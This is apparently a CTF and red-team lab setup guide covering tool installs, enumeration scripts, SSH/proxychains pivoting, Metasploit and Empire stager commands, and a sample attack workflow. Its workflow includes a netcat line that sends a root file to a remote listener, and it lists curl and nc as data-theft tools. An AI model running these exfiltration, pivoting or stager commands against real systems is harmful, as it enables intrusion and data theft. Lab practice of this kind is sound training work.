---
icon: flask-gear
---

# Red Team Framework & Lab Setup

## **Red Team Framework & Lab Setup — Build Your Cyber War Room**

***

Before you can dominate challenges or real-world engagements, you need a **battle-tested hacking environment** — optimized for speed, automation, and operational stealth.\
This guide turns your system into a **red team powerhouse**: a custom-tailored environment built for CTFs, HTB, and offensive operations.

***

### I. 🧩 Core Principles

| Principle         | Description                                                     |
| ----------------- | --------------------------------------------------------------- |
| **Speed**         | Every second counts — automate everything.                      |
| **Isolation**     | Keep lab VMs and targets separated from your main host.         |
| **Persistence**   | Save tools, configs, and scripts for future challenges.         |
| **Repeatability** | Same workflow, same results — every machine.                    |
| **Modularity**    | Build environments that adapt to Web, Pwn, or OSINT challenges. |

***

### II. 🧠 Base Lab Architecture

#### 🧩 Recommended Setup

| Component           | Example                                          | Purpose                       |
| ------------------- | ------------------------------------------------ | ----------------------------- |
| **Host OS**         | Kali Linux / Parrot OS                           | Offensive security toolkit    |
| **VM Manager**      | VirtualBox / VMware                              | Isolated machine environments |
| **Targets**         | Metasploitable, HTB boxes, custom CTF challenges | Practice                      |
| **Network Range**   | 10.10.0.0/24                                     | Segmented CTF network         |
| **VPN Integration** | HTB / TryHackMe VPNs                             | Remote lab connectivity       |

***

#### 🧠 Folder Structure

```
~/CTF-Lab/
├── tools/
│   ├── web/
│   ├── exploit/
│   ├── enumeration/
│   └── reporting/
├── machines/
│   ├── HTB/
│   ├── THM/
│   └── Custom/
├── scripts/
│   ├── enum/
│   ├── privesc/
│   ├── exfil/
├── wordlists/
│   ├── web.txt
│   ├── users.txt
│   └── passwords.txt
└── reports/
```

***

### III. ⚙️ System Optimization

#### 🧩 Update & Base Install

```bash
sudo apt update && sudo apt install -y vim git python3-pip gobuster ffuf nmap metasploit-framework
```

#### 🧠 Essential Packages

```bash
sudo apt install -y john hashcat seclists exiftool sqlmap netcat-traditional smbclient
```

#### 💣 Custom Terminal Aliases

```bash
alias ll='ls -la'
alias ports='netstat -tulanp'
alias scan='nmap -sC -sV'
alias httpserver='python3 -m http.server 8000'
alias extract='tar -xvzf'
```

***

### IV. 🧠 Tool Arsenal Overview

| Category                 | Tool                          | Purpose                   |
| ------------------------ | ----------------------------- | ------------------------- |
| **Enumeration**          | nmap, gobuster, ffuf          | Network and web discovery |
| **Exploitation**         | metasploit, searchsploit      | Launch and craft exploits |
| **Privilege Escalation** | linpeas, winpeas              | Local root/system gains   |
| **Forensics**            | binwalk, exiftool, volatility | File and memory analysis  |
| **Post-Exploitation**    | chisel, proxychains, socat    | Tunneling and pivoting    |
| **Exfiltration**         | nc, curl, scp                 | Data theft and transfer   |
| **Reporting**            | CherryTree, Obsidian, GitBook | Documentation             |

***

### V. 💀 Red Team Toolkit Automation

#### 🧩 Auto Installer Script

```bash
#!/bin/bash
echo "[*] Installing core red team tools..."
sudo apt install -y nmap gobuster ffuf metasploit-framework netcat john hashcat exiftool
git clone https://github.com/carlospolop/PEASS-ng ~/tools/priv-esc
git clone https://github.com/rebootuser/LinEnum ~/tools/priv-esc/LinEnum
git clone https://github.com/mzet-/linux-exploit-suggester ~/tools/privesc/LES
echo "[+] Toolkit ready!"
```

#### 🧠 Auto Enumeration Framework

```bash
#!/bin/bash
ip=$1
echo "[+] Enumerating $ip ..."
nmap -sC -sV -oN $ip/nmap.txt $ip
gobuster dir -u http://$ip -w /usr/share/wordlists/dirb/common.txt -t 50 -o $ip/gobuster.txt
```

***

### VI. ⚙️ Workflow Integration

#### 🔹 Attack Chain (Recommended Order)

1️⃣ **Reconnaissance:** nmap, gobuster, wfuzz\
2️⃣ **Enumeration:** nikto, ffuf, curl\
3️⃣ **Exploitation:** manual or metasploit\
4️⃣ **PrivEsc:** linpeas, winpeas\
5️⃣ **Post-Exploitation:** chisel, exfil\
6️⃣ **Reporting:** GitBook, screenshots, notes

***

### VII. 🧠 Proxychains + Tunneling Integration

#### 🧩 Configure ProxyChains

```
sudo nano /etc/proxychains.conf
```

Append:

```
socks5 127.0.0.1 1080
```

Then tunnel:

```bash
ssh -D 1080 user@pivot
proxychains nmap -sT -Pn 10.10.0.0/24
```

***

### VIII. ⚙️ GitBook + Documentation Setup

#### 🧠 GitBook Directory

```
/notes/
├── guide/
│   ├── scripting/
│   ├── tools/
│   ├── exploitation/
│   └── post-exploitation/
└── writeups/
```

#### 💣 Markdown Template

```markdown
# 🧩 Machine: {Name}
## Enumeration
## Exploitation
## PrivEsc
## Loot
## Lessons Learned
```

***

### IX. 🧰 Environment Hardening

✅ **Isolate Networks**

* Use `Host-Only` or `Internal Network` modes for targets.
* Never bridge CTF machines directly to the internet.

✅ **Snapshots**

* Create pre-exploit and post-exploit snapshots.

✅ **Backup Configs**

```bash
tar czf ~/CTF-Lab-Backup.tar.gz ~/CTF-Lab/
```

✅ **Monitor Traffic**

```bash
tcpdump -i tun0 port 80 or port 443
```

***

### X. 🧠 Custom Red Team VM Setup

#### 💣 Create a Base “Operator” VM

**OS:** Kali / Parrot / Ubuntu Minimal\
**CPU/RAM:** 4 cores, 8 GB\
**Network:** NAT + Host-only adapter\
**Packages:**

```bash
sudo apt install openvpn net-tools git python3-pip terminator
```

**Optional UI Enhancements:**

* ZSH + Oh My Zsh
* Dracula theme for terminal
* Neofetch + colorls

***

### XI. 🧩 Terminal Aesthetic Setup

#### 🧠 Oh My Zsh Installation

```bash
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"
```

#### ⚙️ Add Powerlevel10k Theme

```bash
git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ~/.oh-my-zsh/custom/themes/powerlevel10k
```

#### 💾 ZSH Plugins

```bash
plugins=(git history-substring-search zsh-autosuggestions zsh-syntax-highlighting)
```

Result:\
🚀 Fast, colored terminal with git branches, IPs, and time display.

***

### XII. 💀 Metasploit + Empire Integration

#### 🧩 Start Metasploit RPC

```bash
msfrpcd -P password -S
```

#### ⚙️ Automate with Empire

```bash
uselistener http
usestager windows/launcher_bat
execute
```

#### 🧠 Combine for CTF Automation

Run `Empire` for persistence, `Metasploit` for payloads, and `ProxyChains` for pivoting — all synchronized inside one VM.

***

### XIII. 🧠 Notes, Writeups & Documentation Discipline

✅ **For Every Machine**

* Record ports, services, and credentials.
*   Keep one folder per challenge:

    ```
    /machines/HTB/Injection/
    ├── nmap.txt
    ├── exploit.py
    ├── notes.md
    └── loot/
    ```

✅ **Screenshot Automation**

```bash
gnome-screenshot -f notes/screenshots/$(date +%F_%H-%M).png
```

✅ **Flag Tracker**

```bash
echo "$(date): Injection -> user.txt -> root.txt" >> ~/flags.log
```

***

### XIV. ⚔️ Red Team Workflow Example

```bash
# 1. Connect to VPN
sudo openvpn htb.ovpn

# 2. Scan and Enumerate
nmap -sC -sV -oN scan.txt 10.10.10.10

# 3. Exploit and Gain Shell
python3 exploit.py

# 4. Enumerate PrivEsc
./linpeas.sh

# 5. Exfiltrate Flag
cat /root/root.txt | nc 10.10.14.2 4444

# 6. Log Findings
vim ~/notes/writeups/injection.md
```

***

### XV. 🧠 Pro Tips & Operator Tricks

✅ **Version Control**\
Keep all scripts in a private Git repo:

```bash
git init && git add . && git commit -m "Initial commit"
```

✅ **Automation**\
Integrate small Python utilities for:

* URL fuzzing
* Hash cracking
* Port diffing between scans

✅ **Efficiency**

* Build aliases for scanning & reporting.
* Pre-configure tmux layouts for multitasking shells.

✅ **Persistence**

*   Clone environment across new VMs using:

    ```bash
    VBoxManage export KaliLab -o RedTeam.ova
    VBoxManage import RedTeam.ova
    ```

✅ **Stealth Practice**

* Set up Blue Team detectors (Suricata, Zeek) and test evasion tactics.

***

### XVI. ⚙️ Quick Reference Table

| Category          | Tool                   | Purpose              |
| ----------------- | ---------------------- | -------------------- |
| OS                | Kali / Parrot          | Base environment     |
| VM                | VirtualBox / VMware    | Isolation            |
| Networking        | OpenVPN / ProxyChains  | Lab connectivity     |
| Recon             | Nmap / Gobuster / FFUF | Discovery            |
| Exploitation      | Metasploit / Python    | Initial access       |
| PrivEsc           | PEASS-ng / LES         | Root/system gain     |
| Post-Exploitation | Chisel / Socat         | Pivoting             |
| Documentation     | GitBook / Obsidian     | Reporting & writeups |

***
